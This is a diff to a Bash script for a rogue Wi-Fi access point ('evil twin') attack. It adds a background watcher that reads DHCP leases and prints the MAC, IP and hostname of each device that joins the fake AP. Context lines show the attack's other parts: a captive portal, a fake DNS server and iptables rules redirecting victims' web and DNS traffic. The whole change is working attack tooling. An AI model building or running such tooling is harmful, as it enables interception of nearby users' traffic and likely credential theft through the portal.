@@ -854,6 +854,38 @@ PYEOF
     chmod +x "${script_path}"
 }
 
+###########################################
+# Print a notification when a new client
+# connects to the fake AP (gets a DHCP lease).
+# Globals:
+#   DHCPD_LEASES
+# Arguments:
+#   None
+# Returns:
+#   None
+###########################################
+notify_clients() {
+    local known_macs=""
+    local mac
+    local ip
+    local host
+    while true; do
+        while read -r mac ip host; do
+            case " ${known_macs} " in
+                *" ${mac} "*)
+                    ;;
+                *)
+                    known_macs="${known_macs} ${mac}"
+                    echo ""
+                    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Client connected: ${BOLD_YELLOW}${mac}${GREEN} got ${BOLD_CYAN}${ip}${host:+${GREEN} (${host})}${WHITE}"
+                    echo -ne "${YELLOW}>>${WHITE} "
+                    ;;
+            esac
+        done < <(awk '/^lease /{ip=$2} /hardware ethernet/{mac=$3; gsub(/;/,"",mac)} /client-hostname/{host=$2; gsub(/[;"]+/,"",host)} /^}/{if(mac!="") print mac, ip, host; mac=""; ip=""; host=""}' "${DHCPD_LEASES}" 2>/dev/null)
+        sleep 2
+    done
+}
+
 cleanup() {
     echo ""
     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Cleaning up...${WHITE}"
@@ -866,6 +898,7 @@ cleanup() {
     done
     pkill -f "captive_portal.py" 2>/dev/null || true
     pkill -f "dns_server.py" 2>/dev/null || true
+    [ -n "${CLIENT_WATCHER_PID:-}" ] && kill "${CLIENT_WATCHER_PID}" 2>/dev/null || true
     iptables -t nat -D PREROUTING -i at0 -p tcp --dport 80 -j REDIRECT --to-port 80 2>/dev/null || true
     iptables -t nat -D PREROUTING -i at0 -p tcp --dport 443 -j REDIRECT --to-port 443 2>/dev/null || true
     iptables -t nat -D PREROUTING -i at0 -p udp --dport 53 -j REDIRECT --to-port 53 2>/dev/null || true
@@ -997,6 +1030,8 @@ main() {
                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting DHCP server...${WHITE}"
                     touch "${DHCPD_LEASES}"
                     run_background "dhcpd -d -cf \"${DHCPD_CONF}\" -lf \"${DHCPD_LEASES}\" at0 2>&1 | tee -a ${TMP_DIR}/clts.txt" "dhcpd"
+                    notify_clients &
+                    CLIENT_WATCHER_PID=$!
 
                     echo ""
                     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Attack running! Fake AP: ${BOLD_YELLOW}${selected_essid}${GREEN} on ${BOLD_PURPLE}at0${WHITE}"
